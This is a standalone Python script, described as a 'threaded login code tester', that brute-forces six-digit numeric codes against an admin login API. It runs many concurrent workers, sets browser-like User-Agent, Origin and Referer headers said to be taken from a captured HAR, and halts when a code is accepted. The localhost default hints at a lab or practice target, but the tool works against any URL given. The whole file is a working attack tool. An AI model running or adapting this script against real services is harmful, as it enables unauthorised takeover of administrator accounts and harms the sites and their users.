#!/usr/bin/env python3
import argparse
import threading
from concurrent.futures import ThreadPoolExecutor
import time
import urllib.parse
import requests

# --- Defaults ---
DEFAULT_LOGIN_URL = "http://127.0.0.1:3000/login"


def resolve_login_target(url, origin_override=None, referer_override=None):
    parsed = urllib.parse.urlparse(url)
    origin = origin_override if origin_override else f"{parsed.scheme}://{parsed.netloc}"

    # If user already provided API path, use it
    if "/api/admin/login" in parsed.path:
        login_api = url
    else:
        # prefer the API login path under the same origin
        login_api = f"{origin}/api/admin/login"

    referer = referer_override if referer_override else f"{origin}/admin/"
    return login_api, origin, referer


def threaded_bruteforce(login_url, start, end, width, concurrency, timeout, verbose, origin=None, referer=None, delay=0.0):
    counter = start
    counter_lock = threading.Lock()
    stop_event = threading.Event()

    def get_next_code():
        nonlocal counter
        with counter_lock:
            if counter >= end or stop_event.is_set():
                return None
            code = str(counter).zfill(width)
            counter += 1
            return code

    def worker(worker_id):
        session = requests.Session()
        # apply headers observed in the HAR
        headers = {
            "Origin": origin,
            "Referer": referer,
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
            "Accept": "*/*",
        }
        session.headers.update({k: v for k, v in headers.items() if v})

        while not stop_event.is_set():
            code = get_next_code()
            if code is None:
                return
            if verbose:
                print(f"[*][{worker_id}] Trying {code}...")

            payload = {"code": code}
            try:
                resp = session.post(login_url, json=payload, timeout=timeout)
            except requests.RequestException as e:
                if verbose:
                    print(f"[-][{worker_id}] {code} error: {e}")
                # brief backoff to avoid hot looping on network errors
                time.sleep(min(1, delay or 0.1))
                continue

            # parse JSON safely
            try:
                data = resp.json()
            except ValueError:
                data = {}

            success = False
            # common success heuristics: HTTP 200 and no 'error' field
            if resp.status_code == 200 and not data.get("error"):
                success = True
            # explicit ok flag
            if data.get("ok") is True:
                success = True

            if success:
                print(f"[+] Login successful! code={code} worker={worker_id} status={resp.status_code} response={data}")
                stop_event.set()
                return
            else:
                if verbose:
                    body = resp.text if resp is not None else ""
                    print(f"[-][{worker_id}] {code} failed: status={resp.status_code} body={body[:200]}")

            if delay:
                time.sleep(delay)

    with ThreadPoolExecutor(max_workers=concurrency) as executor:
        futures = [executor.submit(worker, wid) for wid in range(concurrency)]
        try:
            for fut in futures:
                fut.result()
        except KeyboardInterrupt:
            print("Interrupted, stopping...")
            stop_event.set()


def parse_args():
    parser = argparse.ArgumentParser(description="Threaded login code tester")
    parser.add_argument("--url", "-u", default=DEFAULT_LOGIN_URL, help="Login URL or admin page (e.g. https://example.com/admin)")
    parser.add_argument("--concurrency", "-c", type=int, default=10, help="Worker threads")
    parser.add_argument("--start", "-s", type=int, default=0, help="Start numeric code (inclusive)")
    parser.add_argument("--end", "-e", type=int, default=1000000, help="End numeric code (exclusive)")
    parser.add_argument("--width", "-w", type=int, default=6, help="Zero-pad width for codes")
    parser.add_argument("--timeout", "-t", type=int, default=10, help="HTTP timeout seconds")
    parser.add_argument("--delay", "-d", type=float, default=0.0, help="Per-request delay seconds (per worker)")
    parser.add_argument("--origin", help="Override Origin header (e.g. https://example.com)")
    parser.add_argument("--referer", help="Override Referer header (e.g. https://example.com/admin/)")
    parser.add_argument("--verbose", "-v", action="store_true", help="Verbose output")
    return parser.parse_args()


if __name__ == "__main__":
    args = parse_args()
    login_api, origin, referer = resolve_login_target(args.url, origin_override=args.origin, referer_override=args.referer)
    threaded_bruteforce(
        login_url=login_api,
        start=args.start,
        end=args.end,
        width=args.width,
        concurrency=args.concurrency,
        timeout=args.timeout,
        verbose=args.verbose,
        origin=origin,
        referer=referer,
        delay=args.delay,
    )
